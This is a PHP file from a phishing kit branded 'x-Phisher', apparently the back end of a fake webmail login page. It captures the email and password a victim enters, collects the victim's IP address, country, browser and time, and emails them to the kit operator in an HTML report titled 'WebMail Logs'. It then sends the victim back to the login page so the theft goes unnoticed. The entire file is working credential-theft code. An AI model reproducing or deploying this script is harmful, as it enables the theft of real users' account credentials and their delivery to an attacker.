<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
session_start();
if (strlen($_POST['password'])<3) {
	exit();
}
$User    = $_POST['email'];
$Password = $_SESSION['password'] = $_POST['password'];
$TIME_DATE = date('H:i:s d/m/Y');
$auth = $_SESSION ['authenticator'] = $_SESSION['authenticator'];
include('./Your_email.php');
include('./BOTS/get_browser.php');
include('./BOTS/get_ip.php');
$X_MESSAGE = '
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
<html lang="en">

	<head>
	    <meta http-equiv=Content-Type content="text/html; charset=UTF-8">
	    <style type="text/css" nonce="bO4EgwapYzKm7leLp4253ovRou0">
	        body,
	        td,
	        div,
	        p,
	        a,
	        input {
	            font-family: arial, sans-serif;
	        }
	    </style>
	    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	    <style type="text/css" nonce="bO4EgwapYzKm7leLp4253ovRou0">
	        body,
	        td {
	            font-size: 13px
	        }
	        
	        a:link,
	        a:active {
	            color: #1155CC;
	            text-decoration: none
	        }
	        
	        a:hover {
	            text-decoration: underline;
	            cursor: pointer
	        }
	        
	        a:visited {
	            color: ##6611CC
	        }
	        
	        img {
	            border: 0px
	        }
	        
	        pre {
	            white-space: pre;
	            white-space: -moz-pre-wrap;
	            white-space: -o-pre-wrap;
	            white-space: pre-wrap;
	            word-wrap: break-word;
	            max-width: 800px;
	            overflow: auto;
	        }
	        
	        .logo {
	            left: -7px;
	            position: relative;
	        }
	    </style>
    </head>
    <body>
        <div class="bodycontainer">
            <div class="maincontent">
		        <div bgcolor="#FFFFFF" style="margin:0;padding:0">
		            <table border="0" cellpadding="0" cellspacing="0" height="100%" style="min-width:348px" width="100%">
		                <tbody>
		                    <tr height="32px"></tr>
		                    <tr align="center">
		                        <td width="32px"></td>
		                        <td>
		                            <table border="0" cellpadding="0" cellspacing="0" style="max-width:600px">
		                                <tbody>
		                                    <tr>
		                                        <td>
		                                            <table bgcolor="#E6E6E6" border="0" cellpadding="0" cellspacing="0" style="min-width:332px;max-width:600px;border:1px solid #f0f0f0;border-bottom:0;border-top-left-radius:3px;border-top-right-radius:3px" width="100%">
		                                                <tbody>
		                                                    <tr>
		                                                        <td colspan="3" height="120px" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:24px;color:#000000;line-height:1.25;min-width:300px"><center>💰 WebMail Logs 💰</center></td>

		                                                    </tr>
		                                                </tbody>
		                                            </table>
		                                        </td>
		                                    </tr>
		                                    <tr>
		                                        <td>
		                                            <table bgcolor="#FAFAFA" border="0" cellpadding="0" cellspacing="0" style="min-width:332px;max-width:600px;border:1px solid #f0f0f0;border-bottom:1px solid #c0c0c0;border-top:0;border-bottom-left-radius:3px;border-bottom-right-radius:3px"
		                                                width="100%">
		                                                <tbody>
		                                                    <tr height="16px">
		                                                        <td rowspan="3" width="70px"></td>
		                                                        <td height="40px"></td>
		                                                        <td rowspan="3" width="70px"></td>
		                                                    </tr>
		                                                    <tr>
		                                                        <td>
		                                                            <table border="0" cellpadding="0" cellspacing="0" style="min-width:300px">
		                                                                <tbody>
		                                                                    <font size="4"><b>[ User Name ] = </b>'.$User.'</font><br>
		                                                                    <font size="4"><b>[ &nbsp;Password&nbsp; ] = </b>'.$Password.'</font><br><br>
		                                                                    <font size="4"><b>[ Ip Address ] = </b>'.$_COOKIE['ip11'].'</font><br>
		                                                                    <font size="4"><b>[ Country ] = </b>'.$LOOKUP_COUNTRY.'</font><br>
		                                                                    <font size="4"><b>[ &nbsp;&nbsp;Browser&nbsp;&nbsp; ] = </b>'.X_Browser($_SERVER['HTTP_USER_AGENT'])." On ".X_OS($_SERVER['HTTP_USER_AGENT']).'</font><br>
		                                                                    <font size="4"><b>[ &nbsp;Time/Date ] = </b>'.$TIME_DATE.'</font><br><br>
		                                                                </tbody>
		                                                            </table>
		                                                        </td>
		                                                    </tr>
		                                                    <tr height="32px"></tr>
		                                                </tbody>
		                                            </table>
		                                        </td>
		                                    </tr>
		                                    <tr height="16"></tr>
		                                    <tr>
		                                        <td style="max-width:600px;font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:10px;color:#bcbcbc;line-height:1.5"></td>
		                                    </tr>
		                                    <tr>
		                                        <td>
		                                            <table style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:10px;color:#666666;line-height:18px;padding-bottom:10px">
		                                                <tbody>
		                                                    <tr>
		                                                        <td></td>
		                                                    </tr>
		                                                    <tr height="6px"></tr>
		                                                    <tr>
		                                                        <td>
		                                                            <div style="direction:ltr;text-align:left">© 2019 
		                                                                <a href="https://xphisher.com">xphisher.com</a>
		                                                                 | Webmail v2.0.0						             
		                                                            </div>
		                                                        </td>
		                                                    </tr>
		                                                </tbody>
		                                            </table>
		                                        </td>
		                                    </tr>
		                                </tbody>
		                            </table>
		                        </td>
		                    </tr>
		                </tbody>
		            </table>
		        </div>
            </div>
        </div>
    </body>
</html>';
$X_SUBJECT = "WebMail v2 | ".$User."  | ".$LOOKUP_COUNTRY;
$X_HEADERS = "From:X-webmail<Xphisher>\n";
$X_HEADERS .= "MIME-Version: 1.0\n";
$X_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
mail($Your_Email, $X_SUBJECT, $X_MESSAGE, $X_HEADERS);
HEADER("Location: login.php".$auth."&user=".$User, true, 303);
?>